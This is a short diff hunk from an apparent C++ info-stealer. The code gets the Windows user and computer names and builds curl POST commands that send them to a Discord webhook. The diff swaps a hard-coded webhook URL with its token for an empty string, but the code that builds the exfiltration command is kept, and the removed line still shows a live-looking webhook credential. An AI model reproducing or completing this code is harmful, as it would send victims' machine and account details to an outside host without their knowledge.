@@ -16,7 +16,7 @@ int main() {
 	GetUserNameA(user, userSize);
 
 
-	std::string url = "https://discord.com/api/webhooks/1388901884831731902/G4kf5m-5xZTiDMV9RWzaGfsjM3rHQfQ-Zy9ekcIwYf9MdotFpl4s8Tw49oNhY1SZTxmK";
+	std::string url = "";
 	const std::string cmd_1 = "curl -i -H \"Accept: application/json\" -H \"Content-Type:application/json\" -X POST --data \"{\\\"content\\\": \\\"";
 	const std::string cmd_2 = "\\\"}\" ";
 	std::string computerN = cmd_1 + "**[+] Computer Name: **" + computer + cmd_2 + url;
